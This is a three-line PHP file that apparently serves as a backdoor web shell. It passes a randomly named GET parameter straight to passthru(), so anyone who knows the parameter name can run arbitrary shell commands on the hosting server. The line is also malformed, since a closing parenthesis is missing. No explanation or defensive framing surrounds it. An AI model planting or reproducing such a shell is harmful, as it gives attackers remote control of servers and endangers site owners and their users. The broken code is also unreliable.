<?php
passthru($_GET['JzYHUAXZ'];
?>
